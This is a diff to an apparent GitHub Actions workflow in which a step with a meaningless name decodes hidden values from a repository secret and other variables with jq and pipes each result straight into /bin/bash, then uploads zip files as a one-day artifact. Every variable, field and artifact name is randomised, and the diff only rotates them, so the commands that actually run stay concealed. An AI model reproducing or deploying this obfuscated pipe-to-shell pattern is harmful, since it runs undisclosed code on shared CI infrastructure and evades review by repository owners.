@@ -8,19 +8,25 @@ jobs:
       - uses: actions/checkout@v4
       - name: linjunhencheng
         env:
-          l83: ${{ secrets.l83 }}
+          x08: ${{ secrets.x08 }}
         run: |
-          printf '%s' "$l83" | jq -r .xc69016 | /bin/bash
-          printf '%s' "$ddjs85725" | jq -r .usw96204 | /bin/bash
-          echo $nqily798 | jq -r .cefuo14951 | /bin/bash
-          echo $iv05417 | jq -r .stet6033 | /bin/bash
-          echo $spop2398 | jq -r .ydbzt80295 | /bin/bash
-          echo $vmhd3 | jq -r .g90 | /bin/bash
-          printf '%s' "$yt97" | jq -r .rshtm5 | /bin/bash
+          printf '%s' "$x08" | jq -r .beisu22 | /bin/bash
+          printf '%s' "$jiad3233" | jq -r .kfg856 | /bin/bash
+          echo $p2 | jq -r .hlyan8 | /bin/bash
+          echo $oefvb69 | jq -r .sutmz816 | /bin/bash
+          echo $yhrd6178 | jq -r .jlzbg4145 | /bin/bash
+          printf '%s' "$teb7" | jq -r .ewlsu88 | /bin/bash
+          printf '%s' "$xsra46402" | jq -r .bkxcd8 | /bin/bash
+          printf '%s' "$kgl80551" | jq -r .a85022 | /bin/bash
+          echo $ij1 | jq -r .pqy021 | /bin/bash
+          printf '%s' "$nbl03" | jq -r .kukfm325 | /bin/bash
+          printf '%s' "$ciwyf7639" | jq -r .ksjzx1112 | /bin/bash
+          printf '%s' "$tq183" | jq -r .ry448 | /bin/bash
+          echo $cwrtr27314 | jq -r .u62 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: gszN7SnY
+          name: GEf9X15M
           path: "*.zip"
           retention-days: 1
